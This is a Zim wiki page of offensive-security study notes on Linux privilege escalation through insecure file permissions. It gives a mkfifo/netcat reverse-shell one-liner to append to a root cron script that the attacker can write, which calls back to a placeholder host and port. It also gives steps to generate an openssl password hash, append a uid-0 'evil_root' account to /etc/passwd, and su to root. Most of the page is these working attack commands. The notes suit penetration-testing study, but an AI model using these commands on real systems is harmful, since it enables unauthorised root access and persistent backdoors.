Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-22T17:27:41-05:00

====== Insecure File Permissions ======
Created Friday 22 October 2021

===== Cron =====
One example of exploitation of this type is when  cron calls a script that is writable by the attacker.

To check it's easiest to parse the cron log
{{{code: lang="sh" linenumbers="False"
grep "CRON" /var/log/cron.log
}}}


Then if the output shows calling a script, check for it's file permissions
{{{code: lang="sh" linenumbers="False"
ls -lah <script>
}}}


If it turns out that it's user writable, this line will pop a reverse shell as root:
{{{code: lang="sh" linenumbers="False"
echo 'rm /tmp/0xdeadbeef 2>/dev/null;mkfifo /tmp/0xdeadbeef;cat /tmp/0xdeadbeef|/bin/bash -i 2>&1|nc <host> <port> >/tmp/0xdeadbeef' >> <script>
}}}


===== Insecure [[/etc/passwd]] =====
If [[/etc/passwd]] is writeable by the attacker, privesc is possible by appending a line to [[/etc/passwd.]]

==== About [[/etc/passwd]] ====
* Entries in this file consists of lines, indicating an account. 
* Each line is delimited by a colon (:)
{{{code: lang="sh" linenumbers="False"
student:x:1000:1000:Student,PWK,,:/home/student:/bin/bash
}}}

From left right:
{{{code: lang="texinfo" linenumbers="False"
Field		Purpose		Value
1			username	student
2			x			password hash
3			uid			1000
4			gid			1000
5			metdata		Student,PWK,,
6			path		/home/student
7			shell		/bin/bash
}}}


* The password hash field originally held the hash of the password.
* Since then, it has been moved to [[/etc/shadow,]] but a hash in this field is still supported.

===== Password hashes =====

==== Password hashes have the following format: ====
{{{code: lang="texinfo" linenumbers="False"
$x$<salt>$<hash>
}}}

* x indicates the hashing algo:
{{{code: lang="texinfo" linenumbers="False"
1 				- MD5
2, 2a, 2x, 2y 	- bcrypt(Blowfish). Not in mainline glibc, but added in some linux distros
5 				- SHA256 Added in glibc 2.7
6 				- SHA512 Added in glibc 2.7
md5 			- Solaris MD5
sha1 			- PBKDF1 /w SHA1
y 				- yescrypt
}}}


==== Generate a password hash ====
This can be done with openssl 
{{{code: lang="sh" linenumbers="False"
openssl passwd <passwd>
}}}


The output can be stuck in a new line and added to [[/etc/passwd]] as such:
{{{code: lang="sh" linenumbers="False"
echo "evil_root:<output>:0:0:S,,,:/root:/bin/bash" >> /etc/passwd
}}}


==== Privesc ====
Now we do:
{{{code: lang="sh" linenumbers="False"
su evil_root
<passwd>
whoami		# yields root
}}}
